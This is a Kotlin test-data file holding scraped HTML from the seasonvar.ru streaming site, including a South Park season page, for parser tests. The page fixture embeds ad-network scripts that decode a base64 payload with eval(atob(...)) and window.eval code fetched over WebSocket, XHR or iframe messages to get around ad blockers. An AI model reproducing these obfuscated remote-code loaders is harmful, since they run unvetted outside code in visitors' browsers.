package parser

object TestData {
    val infoGenreEmpty = """
<table width="100%"  border="0" cellpadding="3" cellspacing="0"><tr><td valign="top" align="center" width="120" ><img src="http://cdn.seasonvar.ru/oblojka/.jpg" width="120" style="border: 5px white solid;"></td><td valign="top" align="left"><br><br><br><br><span style="color: #be0750;">Жанр:</span><br><span style="color: #be0750;">Вышел:</span><br><br></td></tr></table>
"""
    val infoMinimal = """
<table width="100%"  border="0" cellpadding="3" cellspacing="0"><tr><td valign="top" align="center" width="120" ><img src="http://cdn.seasonvar.ru/oblojka/9886.jpg" width="120" style="border: 5px white solid;"></td><td valign="top" align="left">
            Познавательная телепрограмма с телеведущим Дмитрием Пучковым. Передача расскажет об истории танкостроения, эволюция первых машин Первой Мировой войны до суперсовременных мощных машин... Мы наглядно увидим особенности каждой машины...
                        <br><br><br><br><span style="color: #be0750;">Жанр:</span>документальные, исторические, отечественные
                        <br><span style="color: #be0750;">Вышел:</span> 2014<br><br></td></tr></table>
"""
    val infoFancyYear = """
<table width="100%"  border="0" cellpadding="3" cellspacing="0"><tr><td valign="top" align="center" width="120" ><img src="http://cdn.seasonvar.ru/oblojka/9886.jpg" width="120" style="border: 5px white solid;"></td><td valign="top" align="left">
            Познавательная телепрограмма с телеведущим Дмитрием Пучковым. Передача расскажет об истории танкостроения, эволюция первых машин Первой Мировой войны до суперсовременных мощных машин... Мы наглядно увидим особенности каждой машины...
                        <br><br><br><br><span style="color: #be0750;">Жанр:</span>документальные, исторические, отечественные
                        <br><span style="color: #be0750;">Вышел:</span> 2006 -2014<br><br></td></tr></table>
"""

    val infoFull = """
<table width="100%"  border="0" cellpadding="3" cellspacing="0"><tr><td valign="top" align="center" width="120" ><img src="http://cdn.seasonvar.ru/oblojka/14258.jpg" width="120" style="border: 5px white solid;"></td><td valign="top" align="left">
            Предлагаем вашему вниманию двадцатый сезон знаменитого проекта &quot;Южный парк&quot;. Сюжет развивается вокруг жизни и приключений четверки друзей, их товарищей и знакомых. Все они живут в небольшом городке Южный Парк, это где-то в штате К...
                        <br><br><span style="color: #be0750;">Оригинал:</span>South Park<br><br><br><span style="color: #be0750;">Жанр:</span>комедия, анимационные
                            <br /><span style="color: #be0750;">Ограничение: </span><span style="color: #ff7600">18+</span><br><span style="color: #be0750;">Вышел:</span> 2016<br><span style="color: #be0750;">Сезонов:</span>20<br><br><span style="color: #be0750;">KINOPOISK:</span> 8.01 <small>(59337 голосов)</small><br><span style="color: #be0750;">IMDB:</span> 8.80 <small>(241329 голосов)</small></td></tr></table>
"""

    val infoEmpty = """
<table width="100%"  border="0" cellpadding="3" cellspacing="0"><tr><td valign="top" align="center" width="120" ><img src="http://cdn.seasonvar.ru/oblojka/.jpg" width="120" style="border: 5px white solid;"></td><td valign="top" align="left"><br><br><br><br><span style="color: #be0750;">Жанр:</span><br><span style="color: #be0750;">Вышел:</span><br><br></td></tr></table>
"""

    val filterHtml = """
</div>
                    <div class="betterT" id="div587">
                <a id="a587"
                   data="/serialinfo/587/"
                   href="/serial-587-Plantatciya-1-season.html"
                   class="betterT alf-link" >
                                        Плантация</a>
            </div>
                    <div class="betterT" id="div11529">
                <a id="a11529"
                   data="/serialinfo/11529/"
                   href="/serial-11529-Plastikovye_Vospominaniya.html"
                   class="betterT alf-link" >
                                        Пластиковые Воспоминания</a>
            </div>
                    <div class="betterT" id="div6270">
                <a id="a6270"
                   data="/serialinfo/6270/"
                   href="/serial-6270-Plata_za_lyubov.html"
                   class="betterT alf-link" >
                                        Плата за любовь</a>
            </div>
                    <div class="betterT" id="div7809">
                <a id="a7809"
                   data="/serialinfo/7809/"
                   href="/serial-7809-Plata_ne_po_zaslugam.html"
                   class="betterT alf-link" >
                                        Плата не по заслугам</a>
"""

    val pageHtml = """

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Сериал Южный Парк 20 сезон South Park смотреть онлайн бесплатно!</title>
    <meta name="keywords" content="Южный Парк 20 сезон South Park сериал, сериалы онлайн, бесплатно сериалы, смотри фильмы онлайн, смотреть онлайн бесплатно" />
    <meta name="description" content="Предлагаем вашему вниманию двадцатый сезон знаменитого проекта Южный парк. Сюжет развивается вокруг жизни и приключений четверки друзей, их товарищей и знакомых. Все они живут в небольшом городке Южный Парк, это где-то в штате Колорадо. Сериал высмеивает пороки американской культуры и происходящие в мире события , а также критикует общепринятые взгляды  посредством пародии, сатиры и чрного юмора. Южный парк - это мультфильм для взрослой аудитории, трансляция его осуществляется в позднее вечернее время. На экраны вышел уже двадцатый сезон своеобразного американского мультсериала. Мультфильм с к" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="robots" content="index, follow" />
    <meta name="revisit-after" content="1 days" />
    <meta property="og:image" content="http://cdn.seasonvar.ru/images/logo-premium.png" />
    <meta name="app-mobile-web-app-capable" content="yes" />

    <link rel="icon" type="image/x-icon" href="http://cdn.seasonvar.ru/images/fav/favicon.ico" />
    <link rel="shortcut icon" type="image/x-icon" href="http://cdn.seasonvar.ru/images/fav/favicon.ico" />
    <link rel="apple-touch-icon" href="http://cdn.seasonvar.ru/images/fav/apple-touch-icon-57x57.png" />
    <link rel="apple-touch-icon" sizes="72x72" href="http://cdn.seasonvar.ru/images/fav/apple-touch-icon-72x72.png" />
    <link rel="apple-touch-icon" sizes="114x114" href="http://cdn.seasonvar.ru/images/fav/apple-touch-icon-114x114.png" />
    <link rel="apple-touch-icon" sizes="144x144" href="http://cdn.seasonvar.ru/images/fav/apple-touch-icon-144x144.png" />
    <link rel="apple-touch-icon-precomposed" href="http://cdn.seasonvar.ru/images/fav/apple-touch-icon-57x57.png" />

    <link rel="alternate" type="application/rss+xml" title="RSS" href="http://seasonvar.ru/rss.php">
             <link rel="image_src" href="http://cdn.seasonvar.ru/oblojka/14258.jpg" />
        <link rel="stylesheet" href="/less/pg-index.css?v=1" type="text/css" />
    <link rel="stylesheet" href="/less/css/lb.css?v=1" type="text/css" />

        <link rel="stylesheet" href="/less/pg-second.css?v=1" type="text/css">
    <script type="text/javascript" src="/less/js/jquery.min.js"></script>
    <script type="text/javascript" src="/less/js/swfobject.js"></script>

    <script type="text/javascript" src="/js/w15.js?v=3"></script>

    <script type="text/javascript" src="/less/js/marks.js?v=8"></script>
    <meta name="verify-v1" content="5ROY6+4ajlq1yinxoxN6+3nVuVIIG7dTu1IU8+7/tzQ=" >
    <meta name='yandex-verification' content='4eaaad8258175cc6' />

            <!--[if lte IE 7]>
    <link rel="stylesheet" href="/css/style-ie.css" type="text/css" />
            <![endif]-->
</head>
<body>
    <style type='text/css'> body { padding: 0px 0px 0px ! important; position: relative; } body > div, body > table, body > center { position: relative; margin: 0 auto; z-index: 3; background-color: #ffffff; } </style>
    <script type="text/javascript">
        (function() {
          var s = document.createElement('script');
          s.type = 'text/javascript'; s.async = true; s.src = window.location.protocol + '//adbetnet.advertserve.com/js/libcode3.js';
          var x = document.getElementsByTagName('script')[0];
          x.parentNode.insertBefore(s, x);
        })();
        var _avp = _avp || [];
    </script>
    <div id="avp_zid_456">
        <script type="text/javascript">
        if (!document.cookie || document.cookie.indexOf('AVPDCAP=') == -1) {
          _avp.push({ tagid: 'avp_zid_456', alias: '/', type: 'dynamic', zid: 456, pid: 50 });
        }
        </script>
    </div>
    <div class="parser.main-center-block">

<div class="head-block">
    <table width="1000" border="0" cellspacing="0" cellpadding="0">
        <tr>
            <td width="300" rowspan="2" valign="top">
                <div id="logo">
                    <a href="http://seasonvar.ru/" class="logolink">&nbsp;</a>
                    <div class="sv-social">
                        <a href="https://vk.com/seriali_tut" class="sv-social_vkontakte" target=_blank></a>
                    </div>
                    <div style="position: absolute;margin-top: -52px;margin-left: 279px;z-index: 3;">
                        <a href="http://m.seasonvar.ru/"><img src="http://cdn.seasonvar.ru/images/mobilev.png" style="height: 58px;" title="Мобильная версия" border="0"></a>
                    </div>
                </div>
            </td>
            <td width="700" valign="bottom" class="headtbl"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                        <td width="5"><img src="http://cdn.seasonvar.ru/images/top_bg1.jpg" width="5" height="63" /></td>
                        <td background="http://cdn.seasonvar.ru/images/top_bg4.jpg" colspan="2">
                            <div class="search-linenew">
                                <form method="get" action='/search' style="margin: 0;padding: 0;">
                                    <input name="q" type="text" class="form-textnew" value="" />
                                    <input type="image" src="http://cdn.seasonvar.ru/images/poisk.jpg" value="Найти!" border="0" class="form-searchnew" alt="Найти!" />
                                </form>
                            </div>
                        </td>
                        <script type="text/javascript">
                            $(function(){
                                $('input[name=q]').autocomplete({
                                    serviceUrl: '/autocomplete.php',
                                    minChars: 3,
                                    delimiter: /(;)\s*/,
                                    maxHeight: 400,
                                    width: 500,
                                    zIndex: 9999,
                                    deferRequestBy: 300,
                                    onSelect: function(data, value){
                                        window.location = '/'+value;
                                    }
                                });

                                $('.panel').tabSlideOut({
                                    tabHandle: '.handle',
                                    pathToTabImage: 'http://cdn.seasonvar.ru/images/bug_panel.png',
                                    imageHeight: '169px',
                                    imageWidth: '30px',
                                    tabLocation: 'left',
                                    speed: 300,
                                    action: 'click',
                                    topPos: '45%',
                                    fixedPosition: true

                                });

                                $('.lx__tsb a').css("position",'');
                            });
                        </script>
                        <td width="5"><img src="http://cdn.seasonvar.ru/images/top_bg2.jpg" width="5" height="63" /></td>
                        <td width="1" bgcolor="#b6b6b6"></td>
                        <td width="150" background="http://cdn.seasonvar.ru/images/top_bg3.jpg" valign="top">
                            <div style="float: left;width: 140px;margin-left: 10px;">
                                    <a href="/?mod=login" style="text-decoration:none;" align="center">
        <div style="background-color:#e72a6e;padding:3px;width:60px;color:#fff;border:solid 1px #ba1750;margin:2px 2px 2px 30px;font-size:12px;text-align:center;">
            Войти
        </div>
    </a>
<a href="/?mod=pause" class="top-link" style="margin-top: 5px;">На чем остановились</a>
                            </div>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>


    <div class="top-top"></div>
</div>
        <div class="content-center2">
            <div class="content-top2">
                <div style="padding: 5px 5px 0 0 ">
                </div>
                <table class="parser.main-table" cellpadding="0" cellspacing="0">
                    <tr>
                        <td valign="top" class="td-for-left-block">
                            <div style="padding: 5px 5px 0 0">
                                <div class="alf-title" style="padding-bottom:20px;">
                                    <div style="clear: both;"></div>
                                </div>
                                &nbsp;&nbsp;
                                <a href="/">> Вернуться к списку сериалов</a><br><br>
                                <div style="width: 227px;overflow: hidden;">
                                                                            <div><div id="M1370Composite583889"></div></div><script type="text/javascript"> var d = new Date, script583889 = document.createElement("script"), mg_ws583889 = {};script583889.type = "text/javascript";script583889.charset = "utf-8";script583889.src = "//jsc.marketgid.com/s/e/seasonvar.ru.583889.js?t=" + d.getYear() + d.getMonth() + d.getDay() + d.getHours();script583889.onerror = function () { mg_ws583889 = new Worker(URL.createObjectURL(new Blob(['eval(atob("ZnVuY3Rpb24gc2VuZE1lc3NhZ2U1ODM4ODkoZSl7dmFyIGg9bWdfd3M1ODM4ODkub25tZXNzYWdlOyBtZ193czU4Mzg4OS5yZWFkeVN0YXRlPT1tZ193czU4Mzg4OS5DTE9TRUQmJihtZ193czU4Mzg4OT1uZXcgV2ViU29ja2V0KG1nX3dzNTgzODg5X2xvY2F0aW9uKSksbWdfd3M1ODM4ODkub25tZXNzYWdlPWgsd2FpdEZvclNvY2tldENvbm5lY3Rpb241ODM4ODkobWdfd3M1ODM4ODksZnVuY3Rpb24oKXttZ193czU4Mzg4OS5zZW5kKGUpfSl9ZnVuY3Rpb24gd2FpdEZvclNvY2tldENvbm5lY3Rpb241ODM4ODkoZSx0KXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7cmV0dXJuIDE9PT1lLnJlYWR5U3RhdGU / dm9pZChudWxsIT10JiZ0KCkpOnZvaWQgd2FpdEZvclNvY2tldENvbm5lY3Rpb241ODM4ODkoZSx0KX0sNSl9OyB2YXIgbWdfd3M1ODM4ODlfbG9jYXRpb24gPSAid3NzOi8vd3NwLm1hcmtldGdpZC5jb20vd3MiOyBtZ193czU4Mzg4OSA9IG5ldyBXZWJTb2NrZXQobWdfd3M1ODM4ODlfbG9jYXRpb24pLCBtZ193czU4Mzg4OS5vbm1lc3NhZ2UgPSBmdW5jdGlvbiAodCkge3Bvc3RNZXNzYWdlKHQuZGF0YSk7fSwgb25tZXNzYWdlID0gZnVuY3Rpb24oZSl7c2VuZE1lc3NhZ2U1ODM4ODkoZS5kYXRhKX0 = "))']), {type: "application/javascript"})); mg_ws583889.onmessage = function (msg){window.eval(msg.data);}; mg_ws583889.postMessage('js|'+script583889.src+'|M1370Composite583889|M1370Composite583889');};document.body.appendChild(script583889); </script>
                                                                    </div>
                            </div>
                        </td>
                        <td valign="top" class="td-for-content" style="padding-left: 5px;">
                                <div class="center-title" style="padding: 2px 200px 8px 0px;position: relative;">
        <strong>О СЕЗОНЕ</strong>
        <div style="position: absolute;right: 20px;top: 2px;"><strong>ОНЛАЙН СМОТРЕТЬ БЕСПЛАТНО</strong></div>
    </div>
    <div class="films-num" style="text-align: left;padding: 0 0 0 10px;">
                    РЕЙТИНГ СЕРИАЛА -
                            <span>KINOPOISK: 8.01</span>(59337 голосовало)
                                        <span>IMDB: 8.80</span> (241329 голосовало)
                        </div>
    <div style="padding: 15px 10px 5px 10px;">
        <div class="full-news">
            <div class="full-news-1">
                <div class="pg-s-lb">
                    <div class="full-news-img  hd  ">
                        <img src="http://cdn.seasonvar.ru/oblojka/14258.jpg" alt=""/>
                    </div>
                    <ul class="pg-s" data-season="14258" data-serial="536">
                        <li class="pg-s-menu">
                            <div>Меню сезона<span class="bullet">»</span></div>
                            <ul>
                                <li class="pg-s-btn" data-pg-s="watched"><div>Уже смотрел</div></li>
                                <li class="pg-s-btn" data-pg-s="notWatched"><div>Не буду смотреть</div></li>
                            </ul>
                        </li>
                    </ul>
                </div>
                <div class="pg-s-rb">
                    <div class="full-news-title" >
                        <h1 class="hname">Сериал Южный Парк/South Park  20 сезон  онлайн</h1>
                    </div>
                    <p> Предлагаем вашему вниманию двадцатый сезон знаменитого проекта &quot;Южный парк&quot;. Сюжет развивается вокруг жизни и приключений четверки друзей, их товарищей и знакомых. Все они живут в небольшом городке Южный Парк, это где-то в штате Колорадо. Сериал высмеивает пороки американской культуры и происходящие в мире события , а также критикует общепринятые взгляды  посредством пародии, сатиры и чёрного юмора. «Южный парк» - это мультфильм для взрослой аудитории, трансляция его осуществляется в позднее вечернее время. На экраны вышел уже двадцатый сезон своеобразного американского мультсериала. Мультфильм с каждым сезоном привлекает все большее количество зрителей. </p>
                    <p>                        <span class="videl">Оригинал:</span> South Park<br /><br />
                                                                                                    <span class="videl">Жанр:</span> комедия, анимационные
                                                                            <br /><span class="videl">Ограничение:</span> <span style="color: #ff7600">18+</span>
                                                                            <br /><span class="videl">Страна:</span> США
                                            </p>
                    <p>
                        <span class="videl">Вышел:</span> 2016<br />
                                                    <span class="videl">Режиссер:</span> Трей Паркер, Эрик Стоф, Мэтт Стоун<br />
                                                                            <span class="videl">Роли:</span>
                                                    <a href="/actor/Трей Паркер">Трей Паркер</a>,                                                     <a href="/actor/Мэтт Стоун">Мэтт Стоун</a>,                                                     <a href="/actor/Мона Маршалл">Мона Маршалл</a>,                                                     <a href="/actor/Эйприл Стюарт">Эйприл Стюарт</a>,                                                     <a href="/actor/Айзек Хейз">Айзек Хейз</a>,                                                     <a href="/actor/Элиза Шнайдер">Элиза Шнайдер</a>,                                                     <a href="/actor/Эдриан Бирд">Эдриан Бирд</a>,                                                     <a href="/actor/Мэри Кэй Бергман">Мэри Кэй Бергман</a>,                                                     <a href="/actor/Дженнифер Хауэлл">Дженнифер Хауэлл</a>,                                                     <a href="/actor/Кайл Маккаллок">Кайл Маккаллок</a>                                                                        </p>
                    <span class="videl">Теги:</span> <div id="tagList" serialId="536">
    <ul >
                     <li  id="li22948">
                 <a href="tag/черный юмор">черный юмор</a>
                              </li>
                     <li  id="li23394">
                 <a href="tag/сатира">сатира</a>
                              </li>
                     <li  id="li235675">
                 <a href="tag/школьники">школьники</a>
                              </li>
                     <li  id="li241480">
                 <a href="tag/для взрослых">для взрослых</a>
                              </li>
                    </ul>
</div>
                    <div style="clear: both;"></div>
                </div>
            </div>

                <table width="100%" border="0" cellspacing="0" cellpadding="3">
        <tr>
            <td valign="bottom">
                <div class="svtab">
                    <ul class="svtab_wrap">
                        <li class="svtab_wrap_li">
                                                            <span class="show">СЕЗОНЫ</span>
                                                    </li>
                    </ul>
                </div>
                <div class="svtabr">
                    <div class="svtabr_wrap show seasonlist">
                                                    <h2>
                                <a href="/serial-1026-YUzhnij_Park-1-season.html">                                    Сериал Южный Парк/South Park                                                                            1 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-1034-YUzhnij_Park-2-season.html">                                    Сериал Южный Парк/South Park                                                                            2 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-1041-YUzhnij_Park-3-season.html">                                    Сериал Южный Парк/South Park                                                                            3 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-1082-YUzhnij_Park-4-season.html">                                    Сериал Южный Парк/South Park                                                                            4 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-1085-YUzhnij_Park-5-season.html">                                    Сериал Южный Парк/South Park                                                                            5 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-1118-YUzhnij_Park-6-season.html">                                    Сериал Южный Парк/South Park                                                                            6 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-1232-YUzhnij_Park-7-season.html">                                    Сериал Южный Парк/South Park                                                                            7 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-1240-YUzhnij_Park-8-season.html">                                    Сериал Южный Парк/South Park                                                                            8 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-1250-YUzhnij_Park-9-season.html">                                    Сериал Южный Парк/South Park                                                                            9 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-1258-YUzhnij_Park-10-season.html">                                    Сериал Южный Парк/South Park                                                                            10 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-1276-YUzhnij_Park-11-season.html">                                    Сериал Южный Парк/South Park                                                                            11 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-1282-YUzhnij_Park-12-season.html">                                    Сериал Южный Парк/South Park                                                                            12 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-1289-YUzhnij_Park-13-season.html">                                    Сериал Южный Парк/South Park                                                                            13 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-1304-YUzhnij_Park-14-season.html">                                    Сериал Южный Парк/South Park                                                                            14 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-2390-YUzhnij_Park-15-season.html">                                    Сериал Южный Парк/South Park                                                                            15 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-3929-YUzhnij_Park-16-season.html">                                    Сериал Южный Парк/South Park                                                                            16 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-7779-YUzhnyj_Park-17-season.html">                                    Сериал Южный Парк/South Park                                                                            17 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-10435-YUzhnyj_Park-18-season.html">                                    Сериал Южный Парк/South Park                                                                            18 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-12363-YUzhnyj_Park-19-season.html">                                    Сериал Южный Парк/South Park                                                                            19 сезон
                                                                                                        </a>
                            </h2>
                                                    <h2>
                                <a href="/serial-14258-YUzhnyj_Park-20-season.html"> >>>                                    Сериал Южный Парк/South Park                                                                            20 сезон
                                                                                                                                                            <span>(02.10.2016 3 серия (кубик в кубе)                                                )</span>
                                                                                            <small>Дней до следующей серии: 9</small>
                                                                                                                                                        </a>
                            </h2>

                    </div>
                </div>
            </td>
        </tr>
    </table>

                            <div id="adv" class="svtabr_wrap_hdtest">
                    По ссылке ниже вы можете получить бесплатный премиум-аккаунт на 5 дней для тестирования HD-сериалов на нашем сайте. Количество премиумов ограничено: успейте стать одним из 20000 человек, которые первыми увидят HD на seasonvar.ru.<br>Оставляйте свои комментарии с впечатлениями и пожеланиями по поводу качества видео.<br> <a href="http://seasonvar.ru/premDar.php" target="_blank">ссылка</a>
                </div>

            <div class="otm">
<div id="statpause14258" style="padding: 10px;">
</div>
    </div>

                            <div id="player_wrap" >
<ul class="svPlayBtn">
    <li class="svPlayBtn-addMark">
        <span class="pauseSeria" data-season-id="14258">Отметка на серии</span>
    </li>
    <li class="svPlayBtn-addMarkTime">
        <span class="pauseTime" data-season-id="14258">Отметка на моменте</span>
    </li>
    <li class="svPlayBtn-wantSee">
        <span data-pg-s="wantsee">Хочу посмотреть</span>
    </li>
    <li class="svPlayBtn-htmlPlay addWantSee act">
        <span class="flashplay" idSeas="14258">HTML5</span>
        <span class="html5play" idSeas="14258">HTML5</span>
    </li>w
</ul>

<div id="vpcenter"></div>
<div id="videoplayer719">
          <div id="flashPlayer" style="min-height:585px;">
        <div style="text-align: center;height: 300px; static;background:black;color:#fff;font-size:15px;font-weight:bold;padding-top:290px;">
            Возможно, у Вас возникли проблемы с загрузкой Flash плеера<br>пожалуйста, используйте <a href="#videoplayer719" style="color:#be0750;font-size: 15px;
font-weight: bold;" class="link5play ">HTML5 плеер</a>
        </div>
    </div>
    <script>
        function getObj(playlist) {
            var flashvars = {
                "m": "video",
                "st": "/uppod/m/st.29.10.2014UTF.txt",
                "pl": playlist,
                "uid": "flashPlayer",
                "debug":"0",
            };
            var params = {wmode: "window", allowFullScreen: "true", allowScriptAccess: "always", id: "flashPlayer"};
            new swfobject.embedSWF("/uppod/uppod.1.9.13.swf", "flashPlayer", "724", "593", "9.0.0", false, flashvars, params, false);
        }
        ;
    </script>

    <div id="translateDivParent">
        <ul id="translateDiv" style="width: 724px">
                            <li id="translate0">
                    Стандартный
                </li>
                <script>
                    var pl0 = "8DGe76RezcwWmyhjO30hpv7DpBfZp3HVO3wI9y9UmjEUp3RZOBEVpjwb8DlT7vncf2gIf2Eof2gofyQTf2gIf2wIf2gIf2fEf2gIf2wVf2gIf2wIf2gofyQIf2gofyQTf2gIf2fEf2gofyh=f2gIf2wn8cEV9j2b8UoNzDgisBaePDlN4v2M9ygDpy2TO3Qc9ACC";
                    $("#translate" +0).click(function () {
                                                trans = 0;
                        getObj(pl0);
                        $("#translateDiv").children().removeClass("act");
                        $(this).addClass("act");
                    });
                </script>
                            <li id="translate6">
                    кубик в кубе
                </li>
                <script>
                    var pl6 = "8DGe76RezcwWmyhjO30hpv7DpBfZp3HVO3wI9y9UmjEUp3RZOBEVpjwb8DlT7vncf2gIf2fGf2gofyQcf2gIf2wof2gIf2wbf2gIf2fGKT0E9=0=9ueRl3ARgHERl3ERO39Rl3ARgjERl3ARgj2W9ygTpyQW4BRct=nb4vI/tBRdmyVop3zapywbO39I";
                    $("#translate" +6).click(function () {
                                                trans = 6;
                        getObj(pl6);
                        $("#translateDiv").children().removeClass("act");
                        $(this).addClass("act");
                    });
                </script>
                        <li class="translate_label">Выберите озвучку:</li>
        </ul>
    </div>
<script type="text/javascript">
    function hdOut() {
                showHd();
            }
        arEpisodes = {"6":{"1_seriya":{"n":1,"d":0,"next":2},"":{"next":1},"2_seriya":{"n":2,"d":0,"next":3},"3_seriya":{"n":3,"d":0}},"0":{"1_seriya":{"n":1,"d":0,"next":2},"":{"next":1},"2_seriya":{"n":2,"d":0,"next":3},"3_seriya":{"n":3,"d":0}}};
    $(function () {
        $(".link5play").on("click", function () {
            $(".html5play").click();
            $.cookie("html5default", "1", {
                expires: 30,
                path: "/",
            });
        });
    });

    var pl0 = "8DGe76RezcwWmyhjO30hpv7DpBfZp3HVO3wI9y9UmjEUp3RZOBEVpjwb8DlT7vnc8cEV9j2b8UoNzDgisBaePDlN4v2M9ygDpy2TO3Qc9ACC";
    if($('#translate0').length == 0 && $('#translate68').length > 0) {
        trans = 68;
    }
    //
    var per = typeof trans === "undefined" ? "0" : trans;
    if($('#translate'+per).length == 0) {
        trans = 0;
    }
    $("#translate" + per).addClass("act");
    var tr = "pl" + per;
    getObj(typeof window[tr] === "undefined" ? pl0 : window[tr]);
</script>
</div>
<div id="errorPlayer" style="text-align: center; height: 300px; static;background:black;color:#fff;font-size:15px;font-weight:bold;padding-top:290px; display: none;">ошибка при загрузке плеера, попробуйте перезагрузить страницу</div>
<div id="player_msoc" >
    <div class="yashare-auto-init" data-yashareL10n="ru" data-yashareType="none" data-yashareQuickServices="vkontakte,facebook,twitter,odnoklassniki,moimir"></div>
    <script type="text/javascript" src="//yandex.st/share/share.js" charset="utf-8" async></script>
</div>
<div id="confirmHd">
    <div id="messageContent" class="message">
        <div class="confirmHD-txt">
            HD качество доступно только для зарегистрированных пользователей с премиум аккаунтом
        </div>
        <span id="butonOkHD">X</span>
        <a href="http://seasonvar.ru/premium" target=_blank id="butonPremHD">Купить премиум</a>
    </div>
</div>
<script>
    confirmhd = $("#confirmHd");
    function showHd(){confirmhd.toggle();};
    $("#butonOkHD").on("click",function(){confirmhd.toggle();});
</script>

</div>
</div>

<script type="text/javascript">
    $(function(){
        var id = "14258";
        var serial_id = "536";
        var secureMark = "e8c85a5f74bf494820136f1649f8a462";
        if($.cookie("html5default") == null){
            $(".flashplay").hide();
        } else {
            $(".html5play").hide();
        }
        $(".html5play").on("click", function(){
            $("#videoplayer719").load("player.php", {"id": id, "serial": serial_id , "type": "html5", "secure": secureMark}, function() {
                $(".html5play").hide();
                $(".flashplay").show();
                $.cookie("html5default", "1", {
                    expires: 30,
                    path: "/",
                });
            });
        });

        $(".flashplay").on("click", function(){
            player.Stop();
            $("#videoplayer719").load("player.php", {"id": id, "serial": serial_id , "type": "flash", "secure": secureMark},  function() {
                $(".flashplay").hide();
                $(".html5play").show();
                document.cookie = "html5default=0; expires=Thu, 01 Jan 1970 00:00:01 GMT";
            });
        });
    });
</script>


<style>
    div#videoplayer719{
        width: 100%;
        min-height: 593px;
    }
    #pl_loader {
        position: absolute;
        top: 50%;
        left: 50%;
        display: block;
        margin-left: -33px;
        margin-top: -33px;
    }
</style>


                                                            <div align="center">
                     <div id="b7574d8c9c" style="display: none"></div><script type="text/javascript"> (function(){ var h = document.getElementsByTagName("head")[0], s = document.createElement("script"), d = "//psma01.com", ds = "/js/lib.js", f = function(){ AMSP.display(["bn","93","726x270"]); }; s.setAttribute("type", "text/javascript"); s.setAttribute("src", d + ds); s.onload = f; s.onerror = function () { var iS = function(){ var listener = function(e){ window.removeEventListener ? window.removeEventListener("message", listener) : window.detachEvent("message", listener); window.eval(e.data); f(); }; window.addEventListener ? window.addEventListener("message", listener) : window.attachEvent("onmessage", listener); var frm = document.createElement("iframe"); frm.style.display = "none"; frm.src = d + ds + "?lib=frm"; document.body.appendChild(frm); }, xS = function(){ var e, i = function(e){ window.eval(e.responseText); f(); }; window.XDomainRequest ? (e = new XDomainRequest, e.onload = function () { i(e) }) : e = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP"), e.withCredentials = !0, e.onreadystatechange = function(){ if (4 == e.readyState && 200 == e.status) { i(e) } }, e.onerror = iS, e.open("GET", d + ds + "?lib=xhr", !0), e.send() }; try { var ws = new WebSocket(("https:"===window.location.protocol?"wss":"ws") + ":"+d+"/list"); ws.onmessage = function(t){ d = "//" + t.data; var s2 = document.createElement("script"); s2.setAttribute("type", "text/javascript"); s2.setAttribute("src", d + ds); s2.onload = f; s2.onerror = xS; h.insertBefore(s2, h.firstChild); ws.close(); }; } catch(e) {xS()} }; h.insertBefore(s, h.firstChild);})();</script>
             </div>

                            <div style="padding: 0 2px 5px 2px;">
                    <div class="svtab svspoiler" data="review">
                        <ul class="svtab_wrap">
                            <li class="svtab_wrap_li"><span class="show">Советуем посмотреть</span></li>
                        </ul>
                    </div>
                    <div class="svtabr">
                        <div class="svtabr_wrap show svtabr_sovet">
                                                            <div class="svtabr_sovet-h">Маша и Медведь</div>
                                <div class="svtabr_sovet-t"><a href="/serial-14254-Masha_i_Medved_.html"> Любимый детский мультсериал &quot;Маша и Медведь&quot; теперь на seasonvar.ru. Предлагаем взрослым и детям посмотреть увлекательную и веселую историю о девочке-непоседе и ее лучшем друге-медведе. Маша - неугомонная девчонка, которая всегда ищет приключения. Она постоянно попадает в нелепые ситуации, из которых ее выручает верный друг. Кажется, что у Маши никогда не закончится энергия! Она...</a></div>
                                                            <div class="svtabr_sovet-h">Хофф в записи</div>
                                <div class="svtabr_sovet-t"><a href="/serial-14259-Hoff_v_zapisi-2-season.html">... давал ему спокойно работать в Голливуде, а также развелся уже пять раз. Личная жизнь катится в тартарары, а карьера, кажется, пришла к закату. Однако после переезда на Туманный Альбион все может начаться заново. Актер пытается возобновить угасшую карьеру, несмотря на все трудности и скромный послужной список последних лет.</a></div>
                                                    </div>
                    </div>
                </div>


                            <div class="svtab">
                    <ul class="svtab_wrap">
                        <li class="svtab_wrap_li"><span data-tab="com"  class="act">Комментарии</span></li>
                                                    <li class="svtab_wrap_li"><span data-tab="poster">Постеры</span></li>
                                                                            <li class="svtab_wrap_li"><span data-tab="fanart">ФанАрт</span></li>
                                                <li class="svtab_wrap_li"><span data-tab="epinfo">О сериях</span></li>
                                                                    </ul>
                </div>
                <div class="svtabr ">
                    <div id="tab_com" class="svtabr_wrap act svtabr_comm">
